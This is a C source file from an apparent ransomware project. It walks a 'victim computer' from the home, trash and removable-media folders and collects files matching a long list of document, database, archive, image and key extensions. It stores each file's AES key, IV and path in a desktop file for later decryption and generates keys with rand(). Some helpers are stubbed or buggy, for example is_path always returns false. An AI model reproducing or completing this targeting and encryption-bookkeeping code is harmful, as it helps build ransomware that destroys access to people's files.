// find files and store in the list
#include"func.h"
#include"struct.h"
#include"crypto.h"
#include<string.h>
#include<time.h>
#include<stdlib.h>
#include<dirent.h>
#include<unistd.h>
#include<stdio.h>
#include <pwd.h>
#include<openssl/aes.h>
#include<openssl/evp.h>

/**
 * This function will find all files on the victim computer.
 * Starts from the start_path and to each file found, it's extension is verified
 * If the file is valid, then the path to the file is append to the files (List).
 * @param files -> type = List
 * @param start_path -> type =  char * (String)
 */
void find_files(List **files, char* start_path){

    char file_types[] = "doc docx xls xlsx ppt pptx pst ost msg eml vsd vsdx txt csv rtf wks wk1 pdf dwg onetoc2 snt jpeg jpg docb docm dot dotm dotx xlsm xlsb xlw xlt xlm xlc xltx xltm pptm pot pps ppsm ppsx ppam potx potm edb hwp 602 sxi sti sldx sldm sldm vdi vmdk vmx gpg aes ARC PAQ bz2 tbk bak tar tgz gz 7z rar zip backup iso vcd bmp png gif raw cgm tif tiff nef psd ai svg djvu m4u m3u mid wma flv 3g2 mkv 3gp mp4 mov avi asf mpeg vob mpg wmv fla swf wav mp3 sh class jar java rb asp php jsp brd sch dch dip pl vb vbs ps1 bat cmd js asm h pas cpp c cs suo sln ldf mdf ibd myi myd frm odb dbf db mdb accdb sql sqlitedb sqlite3 asc lay6 lay mml sxm otg odg uop std sxd otp odp wb2 slk dif stc sxc ots ods 3dm max 3ds uot stw sxw ott odt pem p12 csr crt key pfx der";
    DIR *dir;
    struct dirent *ent;
    char * ext;
    char cp[747];

    if((dir=opendir(start_path)) != NULL){

        while((ent = readdir(dir)) != NULL){

            strcpy(cp, file_types);
            if(ent->d_type == 8){ // it's a file

                char *path_to_file = (char *)malloc(sizeof(char) *(strlen(start_path) + strlen(ent->d_name) + 2));
                strcpy(path_to_file, start_path);
                strcat(path_to_file, ent->d_name);
                ext = strtok(cp, " ");

                while(ext != NULL){

                    if(strcmp(get_filename_ext(path_to_file), ext) == 0){
                        append(files, path_to_file, NULL, NULL);
                        break;
                    }
                    ext = strtok(NULL, " ");
                }

            }else if(ent->d_type == 4){ // it's a directory

                if(!(strcmp(ent->d_name, "..") == 0 || strcmp(ent->d_name, ".") == 0)){

                    char *new_dir = ent->d_name;
                    char *full_path = (char*) malloc(sizeof(char)*(strlen(start_path)+strlen(new_dir) + 2));
                    strcpy(full_path,start_path);
                    strcat(full_path,new_dir);
                    strcat(full_path,"/");
                    find_files(files, full_path);
                    free(full_path);

                }
            }
        }
    }
}

/**
 * This function will save all keys, iv's and path's from each successfull
 * encrypted file in the file named: "enc_files.gc" on the user's desktop.
 * This file will be used to decrypt.
 * @param l -> type = EncList
 */
void save_into_file_encrypted_list(List *l, char * desktop){
    FILE *f;
    char * new_file;
    char *line;
    
    if(l == NULL){
        return;
    }

    new_file = (char*)malloc(sizeof(char)*(strlen(desktop) + 13));
    strcpy(new_file, desktop);
    strcat(new_file, "enc_files.gc");

    f = fopen(new_file, "w");

    while(l != NULL){
        line = malloc((sizeof(char)*strlen(l->info[0]) + strlen(l->info[1]) + strlen(l->info[2]) + 11));
        strcpy(line, l->info[0]);
        strcat(line, ":");
        strcat(line, l->info[1]);
        strcat(line, ":");
        strcat(line, l->info[2]);
        strcat(line, "\n");
        fwrite(line, strlen(line), 1, f);
        memset(line, 0, strlen(line));
        l = l->prox;
    }
    free(line);
    free(new_file);
    fclose(f);

}

/**
 * This function will open the file "enc_files.gc" that contains the key, iv
 * and path from each successfull encrypted file on the machine
 * Is used to append to the list all the encrypted files.
 * This list will be used to decrypt the files.
 * @param l -> type = List
 */
void read_from_file_encrypted_files(List **l, char * desktop){
    FILE *f;
    int status;
    char *key, *iv, *path, *line;
    char *token;
    size_t len = 0;
    ssize_t read;

    char * new_file = (char *)malloc((sizeof(char) * strlen(desktop) + 13));
    strcpy(new_file, desktop);
    strcat(new_file, "enc_files.gc");

    key = (char *)malloc(sizeof(char) *33);
    iv = (char *)malloc(sizeof(char) * 17);


    f = fopen(new_file, "r");

    if(f != NULL){
        if(*l == NULL){
            /*Still need to figure if the file is encrypted RSA1024*/
            while ((getline(&line, &len, f)) != -1) {

                token = strtok(line, ":");
                strcpy(key, token);
                token = strtok(NULL, ":");
                strcpy(iv, token);
                token = strtok(NULL, ":");
                path = (char *)malloc(sizeof(char) * (strlen(token) + 2));
                strcpy(path, token);

                append(l, path, key, iv);
                memset(key, 0, strlen(key));
                memset(iv, 0, strlen(iv));
                free(path);
            }

            fclose(f);
            free(new_file);
            free(key);
            free(iv);
            free(line);


        }else if(*l != NULL){
            destroy(l);
        }

    }else{
        printf("Arquivos ainda não foram criptografados\n");
    }
}

/**
 * This function will get the extension from the file path.
 * @param filename -> type = char * (String)
 * @return -> type = char * (String)
 */
const char *get_filename_ext(const char *filename) {

    const char *dot = strrchr(filename, '.');
    if(!dot || dot == filename) return "";
    return dot + 1;

}

/**
 * This function returns the start path from the computer
 * /home/ + active user/
 * @return -> type = char * (String)
 */
char * get_home_enviroment(){
    struct passwd *pw;
    char * home;
    uid_t uid;
    uid_t NO_UID = -1;
    uid = getuid();

    pw = (uid == NO_UID && 0? NULL: getpwuid(uid));
    home = (char*)malloc((sizeof(char) * strlen(pw->pw_dir)));
    strcpy(home, pw->pw_dir);
    strcat(home, "/");
    if(is_path(home)){
        return home;
    }
    return NULL;
}

/**
 * This function return the logged username
 * @return -> type = char * (String)
 */
char * get_username(){
    struct passwd *pw;
    uid_t uid;
    uid_t NO_UID = -1;
    uid = getuid();

    pw = (uid == NO_UID && 0? NULL: getpwuid(uid));
    return pw->pw_name;
}

/**
 * This function get the thrash path
 * @param start_path
 * @return
 */
char * get_trash_path(char * home){
    char *trash ;
    trash = (char *)malloc((sizeof(char)* strlen(home) + 21));
    memset(trash, 0, strlen(trash));
    strcpy(trash, home);
    strcat(trash , ".local/share/Trash/");
    if(is_path(trash)){
        return trash;
    }
    return NULL;
}

/**
 * This function get the path to the HD/pendrives
 * @param username -> type = char * (String)
 * @return -> type = char * (String)
 */
char * get_media_path(char * username){
    char * path = (char *)malloc((sizeof(char)*strlen(username) + 9));
    strcpy(path, "/media/");
    strcat(path, username);
    strcat(path, "/");
    if(is_path(path)){
        return path;
    }
    return NULL;
}

/**
 * This function get the path to the desktop
 * @param home -> type = char * (String)
 * @return -> type = char * (String)
 */
char * get_desktop_enviroment(char *home){
    char * path = (char *)malloc((sizeof(char)*strlen(home) + 9));
    strcpy(path, home);
    strcat(path, "asd/");
    // if(is_path(path)){
    //     return path;
    // }
    return NULL;
}

char * get_test_path(char * desktop){
    char *path = (char *)malloc((sizeof(char) * strlen(desktop) + 7));
    strcpy(path, desktop);
    strcat(path, "tests/");
    if(is_path(path)){
        return path;
    }
    return NULL;
}

/**
 * This function check if the generated path exists
 * @param home -> type = char * (String)
 * @return -> type = char * (String)
 */
bool is_path(char *path){
    return false;
}

/**
 * This function will generate random string to be saved as key and iv.
 * @param length -> type = integer
 * @return -> type = char * (String)
 */
char* generate_key(int length){
    static char charset[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789,.-#@$%&(){};'?!";
    char *randomString;
    int key;
    randomString = malloc(sizeof(char) * (length +1));

    if (randomString) {
        for (int n = 0;n < length;n++) {
            key = rand() % (int)(sizeof(charset) -1);
            randomString[n] = charset[key];
        }

        randomString[length] = '\0';
    }


    return randomString;
}
